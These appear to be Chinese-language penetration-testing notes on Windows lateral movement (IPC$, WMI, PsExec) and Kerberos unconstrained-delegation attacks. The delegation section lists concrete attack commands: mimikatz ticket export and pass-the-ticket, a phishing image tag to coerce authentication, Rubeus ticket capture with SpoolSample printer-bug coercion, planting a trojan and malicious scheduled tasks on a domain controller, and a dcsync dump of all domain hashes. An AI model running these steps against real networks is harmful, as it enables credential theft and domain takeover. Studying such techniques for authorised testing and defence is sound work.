IPC横向

:::info

IPC (Internet Process Connection) 共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC 可以通过验证用户名和密码获得相应的权限，使用 139、445 端口。

利用条件：

1、目标机开启了139和445端口；

2、目标主机管理员开启了ipc$默认共享；

3、知道目标机的账户密码。

:::

WMI横向

:::info
WMI （Windows Mannagement Instrumentation）全称 “windows 管理规范”，从 win2003 开始一直存在。它原本的作用是方便管理员对 windows 主机进行管理。

使用 <font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">wmic</font> 远程执行命令，在远程系统中启动 <font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">Windows Mannagement Instrumentation</font> 服务（目标服务器需要开放 135 端口，wmic 会以管理员权限在远程系统中执行命令）

Windows操作系统默认不会将WMI的操作记录到日志当中，而且因为采用的是无文件攻击，所以导致WMI具有极高的隐蔽性。

利用条件：

1、WMI服务开启，端口135，默认开启。

2、防火墙允许135、445等端口通信。

3、知道目标机的账户密码。

:::

3.1 psexec（微软官方工具）

  • PsExec的使用不需要对方主机开启3389端口，只需要对方开启admin$共享 (该共享默认开启)。假如目标主机开启了防火墙，PsExec 会提示找不到网络路径。

  • 目标机上开启了admin$共享，且未开启防火墙，导致跳板机可以与目标机建立ipc$连接，

    同时释放二进制文件psexecsvc.exe到目标机中，然后在跳板机上通过执行运行PsExec，会为目标机远程创    建一个PsExec服务并启动，接下来攻击者只需在跳板机上利用PsExec的远程命令构造一个交互shell即可实现横向移动。

委派攻击

理论

委派是一种域内应用模式，是指将域内用户账户委派给服务账号，服务账户因此能以用户的身份在域内活动（请求新的服务）

  • 域委派分类：

非约束性委派（UD）

约束性委派（CD）

基于资源的约束委派（RBCD）

  • 账户分类

机器账户： 计算机本身名称的账户，在域中computers组中

主机账户：计算机系统的主机账户，常用于登陆计算机使用，常在域中的users组中

服务账户：计算机安装服务时候创建的账户，用于运行服务，不可登陆计算机

非约束性委派

Adfind工具：https://github.com/mai-lang-chai/AD-Penetration-Testing-Tools/tree/master

  • 思路1

1.查询域内哪些账户设置了非约束委派

2.诱导（主动或被动）域控访问非约束委派的机器IP

在域控上手动命令方式访问受害主机 net use //10.10.10.131/c$

钓鱼方式：网页访问<img src=”file:///\10.10.10.131\c$”

3.导出票据：mimikatz sekurlsa::tickets /export

4.重新导入到内存：mimikatz kerberos::ptt xxx.kirbi

5.连接域控通信：dir \x.x.x.x\c$、copy木马到域控

6.schtasks 远程创建恶意定时任务

  • 思路2（结合打印机漏洞）

利用条件：DC为2012以上、administrator权限监听、打印机服务spooler开启（默认开启）

监听来自DC的请求：Rubeus.exe monitor /interval:2 /filteruser:dc$ > hash.txt

域用户运行SpoolSample.exe强制让DC请求：Spoolsample.exe dc 域成员机器名

Rubeus监听到票据并导入票据到内存中：Rubeus.exe ptt /ticket:xxx(hash文件中的base64编码的数据)

使用mimikatz导出域内所有用户hash：mimikatz lsadump:dcsync /domain:域名 /all /csv command
